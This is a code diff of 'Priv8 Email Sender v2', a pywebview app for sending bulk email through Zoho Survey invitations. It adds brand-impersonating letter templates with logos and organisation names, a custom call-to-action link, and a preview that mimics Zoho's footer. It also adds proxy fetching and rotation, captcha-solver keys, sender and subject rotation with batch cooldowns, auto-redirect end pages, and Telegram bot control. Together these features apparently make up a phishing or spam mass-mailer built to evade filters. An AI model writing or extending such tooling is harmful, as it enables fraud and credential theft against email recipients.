+    survey_theme_color:gv('survey_theme_color'),survey_footer_text:gv('survey_footer_text'),
+    hide_progress_bar:document.getElementById('hide_progress_bar')?.checked||false,
+    survey_terms_text:gv('survey_terms_text'),
+    og_title:gv('og_title'),og_description:gv('og_description'),og_image_url:gv('og_image_url'),
+    og_auto_from_template:document.getElementById('og_auto_from_template')?.checked||false,
   };
   let r;
   if(profIdx==='all'){
@@ -3793,7 +4631,160 @@ async function saveTemplates(){
   if(r&&r.ok)addLog('ok','  Templates saved ('+_templates.length+')');
 }
 
-//  SEND OPTIONS 
+//  TEMPLATE LIBRARY
+let _allTemplates=[], _selectedTplIdx=-1, _activeCat='all';
+
+async function loadTemplateLibrary(){
+  try{
+    const cats=await pywebview.api.get_template_categories();
+    const pills=document.getElementById('cat-pills');
+    if(pills){
+      pills.innerHTML='<button class="pill-cat active" onclick="filterCat(\'all\',this)">All</button>'+
+        cats.map(c=>`<button class="pill-cat" onclick="filterCat('${c}',this)">${c.charAt(0).toUpperCase()+c.slice(1)}</button>`).join('');
+    }
+    _allTemplates=await pywebview.api.get_templates();
+    renderTemplateGrid(_allTemplates);
+  }catch(e){addLog('err','  Failed to load template library: '+e);}
+}
+
+function filterCat(cat,btn){
+  _activeCat=cat;
+  document.querySelectorAll('.pill-cat').forEach(b=>b.classList.remove('active'));
+  if(btn)btn.classList.add('active');
+  filterTemplates();
+}
+
+function filterTemplates(){
+  const q=(document.getElementById('tpl-search')?.value||'').toLowerCase();
+  let tpls=_activeCat==='all'?_allTemplates:_allTemplates.filter(t=>t.category===_activeCat);
+  if(q)tpls=tpls.filter(t=>(t.name||'').toLowerCase().includes(q)||(t.subject||'').toLowerCase().includes(q));
+  renderTemplateGrid(tpls);
+}
+
+function renderTemplateGrid(tpls){
+  const grid=document.getElementById('tpl-grid');
+  if(!grid)return;
+  if(!tpls||!tpls.length){grid.innerHTML='<div style="color:var(--muted);font-size:10px;padding:10px">No templates found</div>';return;}
+  grid.innerHTML=tpls.map(t=>{
+    const idx=_allTemplates.indexOf(t);
+    const c1=t.banner1||t.color_primary||'#0057b8';
+    const c2=t.banner2||t.color_secondary||c1;
+    return `<div class="tpl-card${idx===_selectedTplIdx?' selected':''}" onclick="selectTemplate(${idx})" id="tcard-${idx}">
+      <div class="tpl-card-bar" style="background:linear-gradient(90deg,${c1},${c2})"></div>
+      <div class="tpl-card-name">${t.name||t.id||'Template'}</div>
+      <div class="tpl-card-cat">${t.category||''}</div>
+    </div>`;
+  }).join('');
+}
+
+function selectTemplate(idx){
+  _selectedTplIdx=idx;
+  document.querySelectorAll('.tpl-card').forEach(c=>c.classList.remove('selected'));
+  const card=document.getElementById('tcard-'+idx);
+  if(card)card.classList.add('selected');
+  const t=_allTemplates[idx];
+  if(!t)return;
+  const info=document.getElementById('tpl-selected-info');
+  if(info){
+    info.style.display='';
+    const n=info.querySelector('#tpl-sel-name');
+    const s=info.querySelector('#tpl-sel-subj');
+    if(n)n.textContent=t.name||t.id||'';
+    if(s)s.textContent=(t.subject||'').substring(0,60);
+  }
+}
+
+function applySelectedTemplate(){
+  if(_selectedTplIdx<0||!_allTemplates[_selectedTplIdx]){addLog('err','  Select a template first');return;}
+  const t=_allTemplates[_selectedTplIdx];
+  sv('banner1',t.banner1||t.color_primary||'#0057b8');
+  sv('banner2',t.banner2||t.color_secondary||'#00a3e0');
+  sv('logo_url',t.logo_src||'');
+  sv('logo_bg',t.logo_bg||'#ffffff');
+  sv('org_name',t.org_name||t.title||'');
+  sv('org_sub',t.org_sub||t.subtitle||'');
+  sv('tpl_subject',t.subject||'');
+  const rawBody=(t.body||'').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
+  sv('tpl_body',rawBody);
+  sv('tpl_footer',t.footer_text||'');
+  const _upd=(cid,val)=>{const e=document.getElementById(cid);if(e&&/^#[0-9a-f]{6}$/i.test(val))e.value=val;};
+  _upd('c_b1',t.banner1||'#0057b8');
+  _upd('c_b2',t.banner2||'#00a3e0');
+  _upd('c_logo_bg',t.logo_bg||'#ffffff');
+  rp();
+  addLog('ok',`  Applied: ${t.name||t.id}`);
+}
+
+//  PROXY PANEL
+async function fetchProxies(){
+  const st=document.getElementById('proxy-status');
+  if(st)st.textContent='Fetching...';
+  try{
+    const r=await pywebview.api.fetch_proxies(20);
+    if(!r||!r.ok){if(st)st.textContent='Failed: '+(r&&r.error||'unknown');return;}
+    const sel=document.getElementById('proxy_pool_sel');
+    if(sel)sel.innerHTML=r.proxies.map(p=>`<option value="${p}">${p}</option>`).join('');
+    if(st)st.textContent=`Fetched ${r.total} proxies`;
+    if(r.proxies[0])sv('proxy_p1',r.proxies[0]);
+    if(r.proxies[1])sv('proxy_p2',r.proxies[1]);
+    if(r.proxies[2])sv('proxy_p3',r.proxies[2]);
+    addLog('ok',`  Fetched ${r.total} proxies`);
+  }catch(e){if(st)st.textContent='Error: '+e;addLog('err','  Proxy fetch error: '+e);}
+}
+
+async function assignProxies(){
+  const p1=gv('proxy_p1'),p2=gv('proxy_p2'),p3=gv('proxy_p3');
+  const proxies=[p1,p2,p3].filter(Boolean);
+  if(!proxies.length){addLog('err','  No proxies to assign — fill proxy fields or fetch first');return;}
+  try{
+    const r=await pywebview.api.assign_proxies_to_profiles(proxies);
+    if(r&&r.ok)addLog('ok',`  Assigned ${r.assigned.length} proxies to profiles`);
+    else addLog('err','  Assign failed: '+(r&&r.error||'unknown'));
+  }catch(e){addLog('err','  Assign error: '+e);}
+}
+
+//  LETTER BUILDER
+function getBuilderTemplate(){
+  return{
+    name:gv('org_name')||'Custom',
+    banner1:gv('banner1')||'#0057b8',
+    banner2:gv('banner2')||'#00a3e0',
+    logo_src:gv('logo_url')||'',
+    logo_bg:gv('logo_bg')||'#ffffff',
+    org_name:gv('org_name')||'',
+    org_sub:gv('org_sub')||'',
+    title:gv('org_name')||'',
+    subtitle:gv('org_sub')||'',
+    subject:gv('tpl_subject')||'',
+    body:gv('tpl_body')||'',
+    footer_text:gv('tpl_footer')||'',
+    show_title:true,
+    show_icons:false,
+  };
+}
+
+function saveBuilderTemplate(){
+  const t=getBuilderTemplate();
+  _templates=[t];
+  renderTemplatesUI();
+  saveTemplates();
+  addLog('ok','  Builder template saved as active template');
+}
+
+function addBuilderToList(){
+  const t=getBuilderTemplate();
+  _templates.push(t);
+  renderTemplatesUI();
+  addLog('ok',`  Added to rotation (${_templates.length} total)`);
+}
+
+function syncColorPicker(id,inputId){
+  const v=document.getElementById(inputId)?.value;
+  if(v)sv(id,v);
+  rp();
+}
+
+//  SEND OPTIONS
 async function loadOptsUI(){
   const opts=await pywebview.api.get_send_options();
   document.getElementById('sender_names').value=(opts.sender_names||['Research Team']).join('\n');
@@ -3810,21 +4801,38 @@ async function saveOpts(){
   if(r&&r.ok)addLog('ok',`  Options saved  ${names.length} names, ${subs.length} subjects, rotate every ${re} batch(es)`);
 }
 
-//  PREVIEW 
+//  PREVIEW
 function rp(){
   const iframe=document.getElementById('pf'); if(!iframe)return;
   const b1=gv('banner1')||'#0057b8',b2=gv('banner2')||'#00a3e0';
-  const logo=_logoMode==='file'?_logoData:gv('logo_url');
-  const lh=logo?`<img src="${logo}" style="max-height:44px;display:block;margin:0 auto 8px;object-fit:contain">`:'';
+  // Logo: builder field takes priority, then file upload, then logo_url
+  const builderLogo=gv('logo_url');
+  const logo=builderLogo||((_logoMode==='file')?_logoData:'');
+  const logoBg=gv('logo_bg')||'#ffffff';
+  const orgName=gv('org_name')||'';
+  const orgSub=gv('org_sub')||'';
+  // Body: builder textarea takes priority over _templates[0]
+  const builderBody=gv('tpl_body');
   const t0=_templates[0]||{};
-  const tit=t0.title||"We'd Love Your Feedback!";
-  const sub=t0.subtitle||'';
-  const bdy=(t0.body||'').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
-  const showTitle=t0.show_title||false;
-  const showIcons=t0.show_icons!==false;
+  const bdy=builderBody
+    ?(builderBody.replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&'))
+    :(t0.body||'').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
+  const footerText=gv('tpl_footer')||gv('footer_text')||'';
   const landingUrl=gv('landing_url')||'';
-  const footerText=gv('footer_text')||'';
-  const titleHtml=showTitle?`<h1 style="color:#fff;font-size:18px;font-weight:700;margin:0 0 4px;font-family:Arial">${tit}</h1>`:'';
+  // Decide layout: org mode (has orgName/logo) vs survey mode (show_title/icons)
+  const isOrgMode=!!(orgName||logo);
+  const showTitle=isOrgMode?false:(t0.show_title||false);
+  const showIcons=isOrgMode?false:(t0.show_icons!==false);
+  let lh='';
+  if(logo){
+    const imgBg=isOrgMode?`background:${logoBg};padding:6px;border-radius:6px;`:'';
+    lh=`<img src="${logo}" style="max-height:48px;display:block;margin:0 auto 6px;object-fit:contain;${imgBg}">`;
+  }
+  const tit=orgName||t0.title||"We'd Love Your Feedback!";
+  const sub=orgSub||t0.subtitle||'';
+  const titleHtml=orgName
+    ?`<div style="color:#fff;font-size:16px;font-weight:700;margin:0 0 2px;font-family:Arial">${tit}</div>`
+    :(showTitle?`<h1 style="color:#fff;font-size:18px;font-weight:700;margin:0 0 4px;font-family:Arial">${tit}</h1>`:'');
   const bannerInner=`${lh}${titleHtml}<p style="color:rgba(255,255,255,.82);font-size:11px;margin:4px 0 0;font-family:Arial">${sub}</p>`;
   const bannerContent=landingUrl?`<a href="${landingUrl}" style="display:block;text-decoration:none">${bannerInner}</a>`:bannerInner;
   const iconsHtml=showIcons?`<table width="100%" cellpadding="0" cellspacing="0" style="border-top:1px solid #eee;padding-top:10px"><tr>
@@ -3833,12 +4841,17 @@ function rp(){
 <td style="text-align:center;padding:6px"><p style="font-size:18px;margin:0 0 2px"></p><p style="color:${b1};font-weight:700;font-size:10px;margin:0;font-family:Arial">Impactful</p></td>
 </tr></table>`:'';
   const footerExtra=footerText?`<p style="color:#aaa;font-size:9px;margin:6px 0 0;font-family:Arial;text-align:center">${footerText}</p>`:'';
+  const ctaLink=gv('cta_link')||'';
+  // Selected template btn_text (from _templates[0]) or fallback
+  const tplBtnText=((_templates[0]||{}).btn_text)||'Continue';
+  // CTA block: custom link shows brand-colored button; no link = show Zoho's default "Begin Survey"
+  const ctaHtml=ctaLink
+    ?`<table width="100%" cellpadding="0" cellspacing="0" style="margin:16px 0 4px;border-collapse:collapse"><tr><td align="center"><a href="${ctaLink}" target="_blank" style="display:inline-block;padding:11px 32px;background:${b1};color:#fff;font-size:14px;font-weight:700;font-family:Arial;text-decoration:none;border-radius:4px">${tplBtnText}</a></td></tr></table>`
+    :`<div style="padding:12px 20px;background:#fafafa;border-top:1px solid #eee;text-align:center"><a style="display:inline-block;background:${b1};color:#fff;padding:8px 24px;border-radius:4px;font-size:11px;font-weight:700;text-decoration:none">Begin Survey</a><div style="color:#aaa;font-size:9px;margin-top:6px">Unsubscribe &middot; Powered by Zoho Survey</div></div>`;
+
   iframe.srcdoc=`<!DOCTYPE html><html><head><meta charset="UTF-8">
 <style>body{margin:0;background:#f0f0f0;font-family:Arial}
-.w{max-width:520px;margin:12px auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px #0002}
-.zf{padding:12px 20px;background:#fafafa;border-top:1px solid #eee;text-align:center}
-.zb{display:inline-block;background:${b1};color:#fff;padding:8px 24px;border-radius:4px;font-size:11px;font-weight:700;text-decoration:none}
-.zt{color:#aaa;font-size:9px;margin-top:6px;line-height:1.6}</style></head>
+.w{max-width:520px;margin:12px auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px #0002}</style></head>
 <body><div class="w">
 <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse">
 <tr><td style="background:linear-gradient(135deg,${b1},${b2});padding:18px 20px 13px;text-align:center">
@@ -3848,9 +4861,9 @@ ${bannerContent}
 <tr><td style="padding:14px 20px 10px;background:#fff">
 <p style="color:#555;font-size:13px;line-height:1.7;margin:0 0 8px;font-family:Arial">Dear Participant,</p>
 <p style="color:#555;font-size:13px;line-height:1.7;margin:0 0 12px;font-family:Arial">${bdy}</p>
-${iconsHtml}${footerExtra}</td></tr></table>
-<div class="zf"><a class="zb" href="#">Begin Survey</a>
-<div class="zt">Unsubscribe  Powered by Zoho Survey</div></div>
+${iconsHtml}${footerExtra}
+${ctaLink?ctaHtml:''}</td></tr></table>
+${ctaLink?'':ctaHtml}
 </div></body></html>`;
 }
 
@@ -3863,6 +4876,7 @@ function setPill(which,cls,txt){
 //  CFG 
 function toggleEndPageFields(){
   const t=gv('end_page_type');
+  document.getElementById('ep_ar_wrap').style.display=t==='auto_redirect'?'':'none';
   document.getElementById('ep_url_wrap').style.display=t==='redirect'?'':'none';
   document.getElementById('ep_msg_wrap').style.display=t==='message'?'':'none';
 }
@@ -3875,12 +4889,20 @@ async function saveCfg(){
   const cfg={portal:gv('portal'),dept:gv('dept'),survey:gv('survey'),
     banner1:gv('banner1'),banner2:gv('banner2'),
     landing_url:gv('landing_url'),footer_text:gv('footer_text'),
+    cta_link:gv('cta_link'),
     batch_size:gv('batch_size'),cd_min:gv('cd_min'),cd_max:gv('cd_max'),
     tg_token:gv('tg_token'),tg_chat:gv('tg_chat'),
     reply_to:gv('reply_to'),send_mode:gv('send_mode'),
     schedule_dt:gv('schedule_dt'),
     end_page_type:gv('end_page_type'),end_page_url:gv('end_page_url'),
     end_page_msg:gv('end_page_msg'),
+    ep_ar_url:gv('ep_ar_url'),ep_ar_delay:gv('ep_ar_delay'),
+    survey_button_text:gv('survey_button_text'),survey_logo_url:gv('survey_logo_url'),
+    survey_theme_color:gv('survey_theme_color'),survey_footer_text:gv('survey_footer_text'),
+    hide_progress_bar:document.getElementById('hide_progress_bar')?.checked||false,
+    survey_terms_text:gv('survey_terms_text'),
+    og_title:gv('og_title'),og_description:gv('og_description'),og_image_url:gv('og_image_url'),
+    og_auto_from_template:document.getElementById('og_auto_from_template')?.checked||false,
     captcha_key:gv('captcha_key'),proxy_str:gv('proxy_str')};
   await pywebview.api.save_cfg(cfg); addLog('ok','  Config saved');
 }
@@ -3890,11 +4912,17 @@ async function loadCfg(){
   const m={portal:'portal',dept:'dept',survey:'survey',
     banner1:'banner1',banner2:'banner2',
     landing_url:'landing_url',footer_text:'footer_text',
+    cta_link:'cta_link',
     batch_size:'batch_size',cd_min:'cd_min',cd_max:'cd_max',
     tg_token:'tg_token',tg_chat:'tg_chat',
     reply_to:'reply_to',send_mode:'send_mode',schedule_dt:'schedule_dt',
     end_page_type:'end_page_type',end_page_url:'end_page_url',
     end_page_msg:'end_page_msg',
+    ep_ar_url:'ep_ar_url',ep_ar_delay:'ep_ar_delay',
+    survey_button_text:'survey_button_text',survey_logo_url:'survey_logo_url',
+    survey_theme_color:'survey_theme_color',survey_footer_text:'survey_footer_text',
+    survey_terms_text:'survey_terms_text',
+    og_title:'og_title',og_description:'og_description',og_image_url:'og_image_url',
     captcha_key:'captcha_key',proxy_str:'proxy_str'};
   for(const[k,id]of Object.entries(m)){
     const el=document.getElementById(id);
@@ -3904,6 +4932,10 @@ async function loadCfg(){
   if(c.banner2)document.getElementById('c_b2').value=c.banner2;
   const hb=document.getElementById('hidden_browser');
   if(hb)hb.checked=!!c.hidden_browser;
+  const hpb=document.getElementById('hide_progress_bar');
+  if(hpb)hpb.checked=!!c.hide_progress_bar;
+  const oat=document.getElementById('og_auto_from_template');
+  if(oat&&c.og_auto_from_template!=null)oat.checked=!!c.og_auto_from_template;
   toggleEndPageFields();
   toggleSchedule();
 }
@@ -3960,78 +4992,31 @@ window.addEventListener('pywebviewready', async()=>{
 # 
 
 if __name__ == "__main__":
-    import atexit
-    import signal
+    db_init()
+    api = API()
 
-    # Track if running
-    is_running = True
+    # Load TG credentials + API keys from saved cfg
+    cfg = _load_cfg()
+    tg_token = cfg.get("tg_token", "")
+    tg_chat  = cfg.get("tg_chat",  "")
+    if cfg.get("captcha_key"): CAPTCHA_KEY = cfg["captcha_key"]
+    # NOTE: _DEFAULT_PROXY stays as Webshare Egypt — proxy_str (SOCKS5) is for Send only
 
-    def cleanup(signum=None, frame=None):
-        """Protected shutdown - only allow intentional close"""
-        global is_running
-        if not is_running:
-            return
-        is_running = False
-        print("[ALERT] Application closing - sending alert to Telegram...")
-        try:
-            cfg = _load_cfg()
-            tg_token = cfg.get("tg_token", "")
-            tg_chat = cfg.get("tg_chat", "")
-            if tg_token and tg_chat:
-                import urllib.request
-                msg = f"[ALERT] Priv8 Email Sender v2 closed at {time.strftime('%Y-%m-%d %H:%M:%S')}\nCheck for errors"
-                urllib.request.urlopen(
-                    f"https://api.telegram.org/bot{tg_token}/sendMessage?"
-                    f"chat_id={tg_chat}&text={urllib.parse.quote(msg)}",
-                    timeout=5
-                )
-        except Exception as e:
-            print(f"[ERROR] Failed to send alert: {e}")
-        sys.exit(0)
+    # Start background threads
+    if tg_token and tg_chat:
+        threading.Thread(target=_tg_callback_poll_thread,
+                         args=(tg_token, tg_chat), daemon=True).start()
+        threading.Thread(target=_health_monitor_thread,
+                         args=(tg_token, tg_chat), daemon=True).start()
 
-    # Register signal handlers for clean shutdown
-    signal.signal(signal.SIGINT, cleanup)
-    signal.signal(signal.SIGTERM, cleanup)
-    atexit.register(cleanup)
-
-    try:
-        db_init()
-        api = API()
-
-        # Load TG credentials + API keys from saved cfg
-        cfg = _load_cfg()
-        tg_token = cfg.get("tg_token", "")
-        tg_chat  = cfg.get("tg_chat",  "")
-        if cfg.get("captcha_key"): CAPTCHA_KEY = cfg["captcha_key"]
-        if cfg.get("proxy_str"):   _DEFAULT_PROXY = cfg["proxy_str"]
-
-        print("[OK] Application starting...")
-        print(f"[OK] Telegram alerts: {'Enabled' if tg_token and tg_chat else 'Disabled'}")
-
-        # Start background threads
-        if tg_token and tg_chat:
-            threading.Thread(target=_tg_callback_poll_thread,
-                             args=(tg_token, tg_chat), daemon=True).start()
-            threading.Thread(target=_health_monitor_thread,
-                             args=(tg_token, tg_chat), daemon=True).start()
-
-        window = webview.create_window(
-            "Priv8 Email Sender v2",
-            html=HTML,
-            js_api=api,
-            width=1200,
-            height=800,
-            min_size=(960, 660),
-            background_color="#07101a",
-        )
-        webview.start(debug=False)
-    except KeyboardInterrupt:
-        print("[INTERRUPT] User terminated application")
-        cleanup()
-    except Exception as e:
-        print(f"[FATAL] {e}")
-        import traceback
-        traceback.print_exc()
-        cleanup()
-        sys.exit(1)
+    window = webview.create_window(
+        "Priv8 Email Sender v2",
+        html=HTML,
+        js_api=api,
+        width=1200,
+        height=800,
+        min_size=(960, 660),
+        background_color="#07101a",
+    )
+    webview.start(debug=False)
 
